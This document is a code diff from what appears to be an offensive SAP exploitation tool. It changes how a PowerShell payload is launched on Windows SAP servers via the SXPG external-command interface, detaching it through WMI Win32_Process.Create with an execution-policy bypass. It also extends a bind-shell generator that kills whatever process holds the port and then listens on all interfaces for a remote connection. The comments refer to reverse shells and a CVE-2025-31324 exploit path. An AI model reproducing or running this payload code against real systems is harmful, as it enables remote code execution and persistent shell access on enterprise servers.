@@ -1521,7 +1521,27 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     # -ep bypass overrides the execution policy (Restricted by default on
     # Windows Server 2008 R2) which would otherwise block loading .ps1 files.
     # Inline -c commands are never blocked, only -File; so only this step needs it.
-    sxpg_final_params = f"/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s{_sfx}.ps1"
+    # Launch via WMI Win32_Process.Create for a HARD detach — the
+    # spawned PowerShell inherits none of the caller's handles.  The
+    # previous `cmd.exe /C start /B ...` form kept a stdio pipe open
+    # on kernel 742 / Server 2008 R2, so a long-lived bind shell
+    # blocked SXPG's P4 forever waiting for pipe EOF (reported as
+    # "(command executed, output retrieval failed)" and the target
+    # port never opened).  Reverse shell survived only because its
+    # PowerShell exits when the TCPClient session ends.
+    #
+    # Flow: cmd.exe /C runs a wrapper powershell -c that calls
+    # Win32_Process.Create('powershell -File %TEMP%\sXXXX.ps1').  WMI
+    # spawns the real payload as a separate process with fresh
+    # handles and returns immediately.  Wrapper PS exits, cmd.exe
+    # exits, SXPG P4 gets a clean two-line "ProcessId / ReturnValue"
+    # output, RFC returns fast, SAPMAP connects.  Same detach
+    # primitive the CVE-2025-31324 path uses (see 13334+).
+    sxpg_final_params = (
+        f"/C powershell.exe -nop -c "
+        f"\"([wmiclass]'Win32_Process').Create("
+        f"'powershell -nop -ep bypass -File %TEMP%\\s{_sfx}.ps1')\""
+    )
     assert len(sxpg_decode_params) <= 255, (
         f"SXPG decode params too long: {len(sxpg_decode_params)}")
     assert len(sxpg_final_params)  <= 255, (
@@ -1854,10 +1874,21 @@ def _generate_bind_payload(os_type: str, port: int,
         # `-ErrorAction 0` swallows the harmless "no matching
         # connection" case on a first-run target.  A short Sleep gives
         # the kernel a moment to release the port after Stop-Process.
+        # Zombie cleanup — dual-path so it works on both modern
+        # Windows (2012+ has Get-NetTCPConnection) AND older ones
+        # (Server 2008 R2 / PS 2.0, where the NetTCPIP module doesn't
+        # exist).  netstat -ano + taskkill is universal since XP.
+        # Each block wrapped in try/catch with -EA 0 so a first-run
+        # target (nothing to kill) doesn't blow the pipeline.
         ps = (f"# SAPMAP-MODE: BIND port={port}\n"
-              f"Get-NetTCPConnection -LocalPort {port} -State Listen "
-              f"-EA 0|%{{Stop-Process -Id $_.OwningProcess -Force -EA 0}};"
-              f"Start-Sleep -Milliseconds 500;"
+              f"try{{Get-NetTCPConnection -LocalPort {port} -EA 0|"
+              f"%{{try{{Stop-Process -Id $_.OwningProcess -Force -EA 0}}"
+              f"catch{{}}}}}}catch{{}};"
+              f"try{{$lines=netstat -ano|Select-String ':{port} ' -EA 0;"
+              f"foreach($ln in $lines){{if($ln -match '(\\d+)\\s*$')"
+              f"{{try{{taskkill /F /PID $matches[1] 2>$null|Out-Null}}"
+              f"catch{{}}}}}}}}catch{{}};"
+              f"Start-Sleep -Milliseconds 1000;"
               f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
               f"$l.Start();"
               f"$c=$l.AcceptTcpClient();"
